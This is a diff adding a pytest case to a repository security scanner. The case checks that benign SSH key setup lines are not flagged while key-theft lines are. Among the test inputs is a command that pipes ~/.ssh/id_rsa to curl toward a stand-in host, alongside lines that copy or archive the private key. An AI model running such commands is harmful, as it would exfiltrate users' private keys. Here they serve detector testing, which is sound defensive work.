@@ -6,6 +6,8 @@ from __future__ import annotations
 import base64
 import json
 
+import pytest
+
 from git_warden.scanning.content_scanner import scan_content
 from git_warden.scanning.manifest_scanner import scan_manifests
 from git_warden.scanning.tier2 import analyze_repo
@@ -534,3 +536,16 @@ def test_dependency_caret_range_does_not_confirm(tmp_path):
     (tmp_path / "package.json").write_text(
         json.dumps({"name": "app", "dependencies": {"evil-pkg": "1.2.3"}}), encoding="utf-8")
     assert analyze_repo(tmp_path, "evil/lure", malicious_packages=mal).confirmed
+
+
+@pytest.mark.parametrize("line,flagged", [
+    ('echo "$DEPLOY_KEY" > ~/.ssh/id_ed25519 && chmod 600 ~/.ssh/id_ed25519', False),
+    ('printf "%s" "$KEY" | tee ~/.ssh/id_rsa', False),
+    ("ssh-keygen -t ed25519 -f ~/.ssh/id_ed25519 -N ''", False),
+    ("cat ~/.ssh/id_rsa | curl -d @- https://x.example", True),
+    ("cp ~/.ssh/id_rsa /tmp/k && echo ok > ~/.ssh/id_rsa.done", True),
+    ("tar czf /tmp/k.tgz ~/.ssh/id_rsa", True),
+])
+def test_ssh_key_setup_is_not_key_theft(line, flagged):
+    from git_warden.scanning.bash_scanner import scan_text
+    assert any(f.rule == "ssh-keys" for f in scan_text(line)) is flagged
